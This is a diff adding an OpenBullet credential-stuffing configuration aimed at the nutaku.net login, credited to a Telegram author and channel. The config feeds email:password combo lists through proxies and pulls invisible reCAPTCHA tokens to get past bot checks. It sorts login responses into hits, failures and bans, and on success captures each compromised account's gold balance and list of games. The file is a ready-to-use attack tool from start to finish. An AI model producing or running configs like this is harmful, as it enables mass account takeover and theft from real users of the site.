@@ -1,0 +1,161 @@
+[SETTINGS]
+{
+  "Name": "nutaku.net",
+  "SuggestedBots": 60,
+  "MaxCPM": 0,
+  "LastModified": "2021-05-28T23:46:27.898424+04:30",
+  "AdditionalInfo": "Telegram Channel: https://t.me/OpenBulletChannel",
+  "Author": "@Hogo_Victor",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "Author Telegram Id:@Hogo_Victor",
+      "VariableName": "",
+      "Id": 423164326
+    }
+  ],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Get REQUEST GET "https://www.nutaku.net/" 
+  
+  HEADER "Host: www.nutaku.net" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Dnt: 1" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Te: trailers" 
+  HEADER "Connection: close" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Ban OR 
+    KEY "<RESPONSECODE>" EqualTo "503" 
+
+#Get REQUEST GET "https://www.google.com/recaptcha/api2/anchor?ar=1&k=6LeYrHcUAAAAACfhNNf9zgmdglkcUMwfAkmMD-na&co=aHR0cHM6Ly93d3cubnV0YWt1Lm5ldDo0NDM.&hl=en&v=sG0iO6gHcGdWJzjJjW9AY49S&size=invisible&cb=u3xaul43uc02" 
+  
+  HEADER "=Host: www.google.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Dnt: 1" 
+  HEADER "Referer: https://www.nutaku.net/" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Te: trailers" 
+  HEADER "Connection: close" 
+
+#token PARSE "<SOURCE>" LR "id=\"recaptcha-token\" value=\"" "\"" -> VAR "token" 
+
+#Post REQUEST POST "https://www.google.com/recaptcha/api2/reload?k=6LeYrHcUAAAAACfhNNf9zgmdglkcUMwfAkmMD-na" 
+  CONTENT "sG0iO6gHcGdWJzjJjW9AY49S&reason=q&c=<token>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+
+#rresp PARSE "<SOURCE>" LR "rresp\",\"" "\"" -> VAR "rresp" 
+
+#Login REQUEST POST "https://www.nutaku.net/execute-login/" 
+  CONTENT "email=<USER>&password=<PASS>&rememberMe=1&recaptcha=<rresp>" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Host: www.nutaku.net" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "X-Csrf-Token: <COOKIES(XSRF-TOKEN)>" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Origin: https://www.nutaku.net" 
+  HEADER "Dnt: 1" 
+  HEADER "Referer: https://www.nutaku.net/" 
+  HEADER "Te: trailers" 
+  HEADER "Connection: close" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "<RESPONSECODE>" EqualTo "400" 
+  KEYCHAIN Success OR 
+    KEY "<RESPONSECODE>" EqualTo "200" 
+  KEYCHAIN Ban OR 
+    KEY "<RESPONSECODE>" EqualTo "500" 
+
+#Get REQUEST GET "https://www.nutaku.net/home/" 
+  
+  HEADER "Host: www.nutaku.net" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Referer: https://www.nutaku.net/" 
+  HEADER "Dnt: 1" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Te: trailers" 
+  HEADER "Connection: close" 
+
+#Gold PARSE "<SOURCE>" LR "gold cart - balance\"           >" "</" CreateEmpty=FALSE -> CAP "Gold" 
+
+#Get REQUEST GET "https://www.nutaku.net/members/mygames/" 
+  
+  HEADER "Host: www.nutaku.net" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Dnt: 1" 
+  HEADER "Referer: https://www.nutaku.net/home/" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Te: trailers" 
+  HEADER "Connection: close" 
+
+#G PARSE "<SOURCE>" LR "general-title full-w txt-one-line\">" "</" Recursive=TRUE -> VAR "G" 
+
+#GG FUNCTION Replace "&amp; Uncensored" "" "<G>" -> VAR "GG" 
+
+#GGG FUNCTION RegexMatch "\\w.*?," "<GG>" -> VAR "GGG" 
+
+#Games FUNCTION Replace "<GGG> " "" "<GG>" -> CAP "Games" 
+
+#GC UTILITY List "G" Length -> VAR "GC" 
+
+#Games_Count FUNCTION Compute "<GC>-1" -> CAP "Games Count" 
+
+#Telegram_Channel FUNCTION Constant "https://t.me/OpenBulletChannel" -> CAP "Telegram Channel" 
+
